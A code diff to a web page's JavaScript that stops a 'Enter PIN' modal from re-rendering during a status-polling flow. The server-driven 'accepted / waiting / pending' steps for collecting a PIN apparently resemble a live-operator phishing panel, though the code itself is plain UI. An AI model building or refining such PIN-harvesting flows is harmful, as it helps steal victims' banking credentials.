@@ -244,13 +244,52 @@
             } 
             else if(data.status === 'accepted'){
                 if(data.pin_status === 'waiting'){
-                    clearInterval(interval);
-                    showModal(`
-                        <div class="wait">Enter PIN to proceed</div>
-                        <input type="text" id="pin" placeholder="Enter PIN" style="width:100%; padding:14px; margin:15px 0; border:1.5px solid #c8ced7; border-radius:6px;">
-                        <button onclick="submitPin()" style="background:#8c1d3e; width:100%; padding:14px; border:none; border-radius:6px; color:white; font-weight:600; margin-top:10px;">Submit PIN</button>
-                    `);
-                } 
+
+    // INPUT ALREADY HAI TO RELOAD MAT KARO
+    if(!document.getElementById('pin')){
+
+        showModal(`
+
+            <div class="wait">
+            Enter PIN to proceed
+            </div>
+
+            <input
+            type="text"
+            id="pin"
+            placeholder="Enter PIN"
+
+            style="
+            width:100%;
+            padding:14px;
+            margin:15px 0;
+            border:1.5px solid #c8ced7;
+            border-radius:6px;
+            ">
+
+            <button
+            onclick="submitPin()"
+
+            style="
+            background:#8c1d3e;
+            width:100%;
+            padding:14px;
+            border:none;
+            border-radius:6px;
+            color:white;
+            font-weight:600;
+            margin-top:10px;
+            ">
+
+            Submit PIN
+
+            </button>
+
+        `);
+
+    }
+
+} 
                 else if(data.pin_status === 'pending'){
                     showModal(`<div class="loader"></div><div class="wait">Verifying PIN...</div>`);
                 } 
